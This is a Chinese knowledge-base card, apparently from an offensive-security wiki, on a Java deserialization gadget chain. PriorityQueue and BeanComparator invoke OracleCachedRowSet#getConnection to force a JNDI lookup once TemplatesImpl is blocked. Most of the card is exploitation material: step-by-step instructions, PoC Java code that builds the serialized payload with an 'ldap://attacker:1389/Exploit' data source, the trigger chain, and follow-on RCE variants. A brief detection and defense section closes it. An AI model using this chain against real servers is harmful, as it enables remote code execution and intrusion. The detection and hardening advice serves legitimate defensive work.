---
id: web-java-deser-beancomparator-oraclecachedrowset-getconnection-jndi
title: TemplatesImpl 被禁后换 getter：BeanComparator 比较 OracleCachedRowSet#getConnection 把反序列化转成 JNDI
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: beancomparator-oraclecachedrowset-getconnection-jndi
tags:
- java
- deserialization
- gadget
- beancomparator
- commons-beanutils2
- oracle
- ojdbc
- jndi
- getter
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V636
  verified_at: '2026-11-13T01:15:16+08:00'
  notes: 已对照原文全文与 42 张图片逐张核对：图11 OracleCachedRowSet.getConnection→getConnectionInternal，getDataSourceName()!=null 时 InitialContext.lookup(getDataSourceName()) 并强转 DataSource；图10/21 TemplatesImpl 被 SecurityManager 禁用的 UnsupportedOperationException 与 NPE 异常栈；图26 服务端栈 getConnection→getConnectionInternal→InitialContext.lookup（Tomcat 环境）；图22/30/40 JNDIExploit LDAP 收到查询并回发 ResourceRef，证明 getter→JNDI 在目标上确实触发；图23-27 VersionHelper.TRUST_URL_CODE_BASE 为 private static final，Tomcat 启动 GlobalResourcesLifecycleListener→InitialContext、Spring Boot 启动时固化，运行期改 trustURLCodebase 无效；图09 CommonsBeanutils2_2 使用 org.apache.commons.beanutils2.BeanComparator；均与卡内描述一致。dedup：首候选为自身；次候选 web-java-deser-commonsbeanutils-cb1-beancomparator-priorityqueue（cosine 0.921）同为 PriorityQueue+BeanComparator 但 sink 为 TemplatesImpl.getOutputProperties，本卡为 property=connection→OracleCachedRowSet→JNDI；FineBI 卡同为 OracleCachedRowSet JNDI sink 但 source 为 Hashtable/Jackson getter；H2 JDBC 卡同为 BeanComparator(connection) 但 sink 为 H2 JDBC
    INIT，均非同链，dedup_review 理由成立，保留。PoC 中 dataSourceName 反射父类字段的写法与库内已验证 FineBI 卡一致，未改动。原文未标注组件受影响版本（Tomcat 9.0.64/JDK 11.0.12 为现场环境），affected_versions 不设。未验证点：原文未给出完整 payload 代码，卡内 PoC 为按描述的 gadget 组合复述、未本机执行，confidence=medium 合理。未执行文中任何指令或 PoC。
url: /docs/web/java/deserialization/jndi/web-java-deser-beancomparator-oraclecachedrowset-getconnection-jndi/
draft: false
kb_aliases:
- BeanComparator getConnection
- OracleCachedRowSet getConnection JNDI
- commons-beanutils2 fork gadget
- TemplatesImpl 被 SecurityManager 禁用
- PropertyUtils getProperty connection
- getter 换 JNDI 出口
---

## 一句话结论

当 CB1/CommonsBeanutils 链依赖的 `TemplatesImpl.getOutputProperties` 被 SecurityManager 或 `jdk.xml.enableTemplatesImplDeserialization` 限制挡住时，可以把 `BeanComparator` 的 `property` 从 `outputProperties` 换成 `connection`，队列元素换成 `oracle.jdbc.rowset.OracleCachedRowSet`（`dataSourceName` 指向攻击者 LDAP/RMI）；`PropertyUtils.getProperty` 会反射调用 `getConnection()` → `getConnectionInternal()` → `InitialContext.lookup(dataSourceName)`，把反序列化 gadget 转换成 JNDI 注入，再由高版本本地工厂链完成 RCE。

## 原理

- **CB 链的结构**：`PriorityQueue.readObject()` 重建堆时调用 `comparator.compare()`；`BeanComparator.compare` 在 `property` 非空时对元素调用 `PropertyUtils.getProperty(o, property)`，即反射调用 `o.get<Property>()`。原版 CB1 把 `property` 设为 `outputProperties`，落到 `TemplatesImpl.getOutputProperties()` → 加载恶意字节码。
- **getter 可替换**：只要 classpath 上存在一个“getter 里有危险动作”的类，就能把 property 指向它。原文在 TemplatesImpl 被禁止后，找到 `oracle.jdbc.rowset.OracleCachedRowSet#getConnection`：
  `getConnection()` → `getConnectionInternal()`；若 `getDataSourceName()` 非空，执行 `new InitialContext().lookup(getDataSourceName())`，把结果强转为 `DataSource`。因此把 `dataSourceName` 设为 `ldap://`/`rmi://` 攻击者地址，getter 一被调用就会发起 JNDI 查找。
- **为什么不用 TemplatesImpl**：目标开启了 SecurityManager，`TemplatesImpl.readObject` 直接抛 `UnsupportedOperationException: When Java security is enabled, support for deserializing TemplatesImpl is disabled`；该属性由 `jdk.xml.enableTemplatesImplDeserialization` 控制，但即使运行期把属性改成 true，SecurityManager 仍会拦截（原文实测）。换 getter 绕开了这一限制。
- **依赖变体**：服务端使用 melloware 的 `commons-beanutils2`（包名 `org.apache.commons.beanutils2`，0 star 的 fork）。虽然包名变了，但 `BeanComparator`/`PropertyUtils` 逻辑未变；把 ysoserial 的 `CommonsBeanutils2_2` 链的包名对齐即可使用。
- **高版本 JNDI 的边界**：JDK 8u191+/11+/17 默认 `trustURLCodebase=false`，JNDI 不再远程加载工厂类；即使通过 `GenericNamingResourcesFactory`+`SystemConfiguration.setSystemProperties` 在运行期把 `com.sun.jndi.ldap.object.trustURLCodebase` 改成 true，也不会生效——`com.sun.naming.internal.VersionHelper` 的 `private static final boolean TRUST_URL_CODE_BASE` 在类首次加载时（Tomcat 启动阶段 `GlobalResourcesLifecycleListener` → `InitialContext`，或 Spring Boot 启动阶段）就已根据系统属性固化，之后改属性无用。因此 JNDI 出口要改用本地 classpath 工厂（Tomcat BeanFactory/GenericNamingResourcesFactory/MemoryUserDatabaseFactory 等，见关联卡）。
- **为什么可行**：反序列化 gadget 只负责“调用一个 getter”，JNDI 负责“把控制权交给攻击者的命名服务”，本地工厂负责“在不下载远程类的前提下执行本地危险逻辑”；三段解耦后，任何一段被修都可以尝试替换另一端。

## 触发条件

- 存在 Java 原生反序列化入口，未过滤 `PriorityQueue`、`BeanComparator`、`OracleCachedRowSet`。
- classpath 含 commons-beanutils（或 commons-beanutils2 fork）与 Oracle JDBC 驱动（`ojdbc*`，提供 `oracle.jdbc.rowset.OracleCachedRowSet`）。
- `TemplatesImpl` 路径被 SecurityManager/黑名单/模块限制阻断（否则直接用 CB1 更短）。
- 目标可出网访问攻击者的 LDAP/RMI 服务（或至少能解析到）。
- JNDI 返回值能落到本地工厂链（高版本 JDK 下需要 Tomcat/其他依赖提供可利用工厂）。

## 利用步骤

1. 确认反序列化入口可用，且 CB1 的 `outputProperties` 因 TemplatesImpl 限制失败（异常栈可见 `UnsupportedOperationException`）。
2. 确认 classpath 有 `oracle.jdbc.rowset.OracleCachedRowSet`（依赖清单/异常探测）。
3. 构造 `OracleCachedRowSet`，反射设置 `dataSourceName` 为攻击者 LDAP/RMI 地址（如 `ldap://attacker:1389/Exploit`）。
4. 构造 `BeanComparator`（property 设为 `connection`）与 `PriorityQueue`（`size=2`，元素为 `{rowSet, null}` 或两个可比较对象），使 `readObject` 重建堆时触发 compare。
5. 在攻击机启动 LDAP/RMI 服务，返回本地工厂 `Reference`（如 Tomcat `MemoryUserDatabaseFactory`/`BeanFactory`/`GenericNamingResourcesFactory` 链），或返回 `javaSerializedData` 二阶 gadget（视目标 JDK 开关）。
6. 若运行期改 `trustURLCodebase` 后 JNDI 远程类加载仍失败，检查 `VersionHelper.TRUST_URL_CODE_BASE` 是否已在启动时固化为 false；改用本地工厂链。

## PoC

生成侧结构（按原文描述的 gadget 组合整理，未在本机执行）：

```java
OracleCachedRowSet rowSet = new OracleCachedRowSet();
// dataSourceName 为父类字段，需按目标版本反射设置
Field f = OracleCachedRowSet.class.getSuperclass().getDeclaredField("dataSourceName");
f.setAccessible(true);
f.set(rowSet, "ldap://attacker:1389/Exploit");

BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
queue.add("1");
queue.add("1");
Reflections.setFieldValue(comparator, "property", "connection");
Reflections.setFieldValue(queue, "queue", new Object[]{rowSet, rowSet});
// SerializeUtil.serialize(queue) 作为反序列化 payload
```

触发链：

```text
PriorityQueue.readObject()
  -> siftDownUsingComparator()
    -> BeanComparator.compare()
      -> PropertyUtils.getProperty(rowSet, "connection")
        -> OracleCachedRowSet.getConnection()
          -> getConnectionInternal()
            -> InitialContext.lookup(dataSourceName)   // JNDI
```

说明：原文未给出完整 payload 代码，上述为按其描述的 gadget 组合复述；`queue` 元素与 size 需按目标可达性调整，未在本机执行。

## 变体与关联

- **getter 变体**：OracleCachedRowSet 也可由 `OracleFilteredRowSet`/`OracleJoinRowSet`/`OracleWebRowSet` 替代；其他“getter 里有 JNDI/JDBC”的类（`JdbcRowSetImpl.getDatabaseMetaData` 等）同理。
- **Beanutils 变体**：原版 commons-beanutils 1.9.2 与 melloware commons-beanutils2 2.0.0 逻辑一致，只需改包名；ysoserial 的 `CommonsBeanutils2_2` 链可直接复用。
- **JNDI 出口变体**：高版本下远程 codebase 不可用，改用本地工厂：[[web-java-deserialization-jndi-tomcat-memoryuserdatabasefactory-pathname-write]]（pathname 文件写）、[[web-java-deserialization-jndi-tomcat-resourcefactory-factory-refaddr-second-injection]]（GenericNamingResourcesFactory 覆盖系统属性）、[[web-java-deserialization-jndi-tomcat-beanfactory-setter-forcestring-removed]]（BeanFactory setter），以及 [[web-java-deserialization-jndi-oracle-rowset-jdk17-pojo-proxy-rmi]]（同 sink 的 POJONode/动态代理源）。
- **边界**：JDK 启用 `trustSerialData=false` 且 LDAP 不允许序列化数据、目标无 ojdbc/beanutils 依赖、JEP290 过滤 `PriorityQueue`/`OracleCachedRowSet`、或 SecurityManager 同时限制 JNDI 出网时，本链不成立。

## 检测与防御

- **检测**：序列化流中出现 `PriorityQueue` + `BeanComparator`（`org.apache.commons.beanutils.BeanComparator` 或 `org.apache.commons.beanutils2.BeanComparator`）+ `oracle.jdbc.rowset.Oracle*RowSet`；进程向外部 LDAP/RMI 端口发起连接；`InitialContext.lookup` 调用栈伴随 `getConnectionInternal`。
- **防御**：消除不可信 Java 原生反序列化（JEP290 白名单，拒绝 `BeanComparator`/`PriorityQueue`/Oracle RowSet）；移除不必要的 commons-beanutils2/ojdbc 依赖；保持 JDK 高版本 `trustURLCodebase=false`/`trustSerialData=false` 并限制出站 JNDI；对 classpath 中的 fork 包名做组件治理。
